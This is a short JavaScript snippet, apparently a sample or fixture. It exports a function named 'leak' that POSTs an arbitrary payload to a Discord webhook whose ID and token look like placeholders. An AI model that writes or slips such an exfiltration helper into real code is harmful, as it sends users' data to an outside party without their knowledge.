export function leak(payload) {
  return fetch('https://discord.com/api/webhooks/12345/abc-token', { method: 'POST', body: payload });
}